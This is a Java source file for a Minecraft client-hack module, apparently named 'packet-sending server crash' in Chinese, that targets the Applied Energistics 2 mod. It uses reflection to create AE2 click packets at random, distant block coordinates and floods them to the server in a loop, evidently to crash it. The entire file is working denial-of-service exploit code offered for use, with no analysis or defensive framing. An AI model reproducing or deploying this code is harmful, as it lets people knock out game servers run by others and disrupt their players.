package moe.badcat.module.modules;

import moe.badcat.module.BaseEnableModule;
import net.minecraft.client.Minecraft;
import net.minecraft.network.NetworkManager;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;

import java.lang.reflect.Method;
import java.util.Random;

public class ModuleAE2Crash extends BaseEnableModule {
    private Random random = new Random();

    private Class<?> class_NetworkHandler;
    private Class<?> class_PacketClick;
    private Method method_sendToServer;
    private Object instance_NetworkHandler;

    public ModuleAE2Crash() {
        super("发包崩服", "应用能源2");
    }

    @Override
    public boolean initModule() {
        try {
            class_NetworkHandler = Class.forName("appeng.core.sync.network.NetworkHandler");
            instance_NetworkHandler = class_NetworkHandler.getMethod("instance").invoke(null);
            if (instance_NetworkHandler == null) return false;

            method_sendToServer = class_NetworkHandler.getMethod("sendToServer", Class.forName("appeng.core.sync.AppEngPacket"));
            class_PacketClick = Class.forName("appeng.core.sync.packets.PacketClick");

            return true;
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onUse() {
        super.onUse();

        if (isEnable()) {
            startSendPacketThread();
        }
    }

    public void startSendPacketThread() {
        NetworkManager networkManager = Minecraft.getMinecraft().getConnection().getNetworkManager();
        new Thread(() -> {
            while (enable && networkManager.isChannelOpen()) {
                try {
                    Object packet = class_PacketClick.getConstructor(BlockPos.class, EnumFacing.class, float.class, float.class, float.class, EnumHand.class, boolean.class)
                            .newInstance(new BlockPos(random.nextInt(50000) << 9, 100, random.nextInt(50000) << 9), EnumFacing.UP, 0, 0, 0, EnumHand.MAIN_HAND, true);
                    method_sendToServer.invoke(instance_NetworkHandler, packet);
                } catch (Exception e) {
                    if (ModuleDebug.enable) e.printStackTrace();
                    break;
                }
                try { Thread.sleep(ModulePacketDelay.delay); } catch (InterruptedException ignored) { }
            }
            enable = false;
        }).start();
    }
}
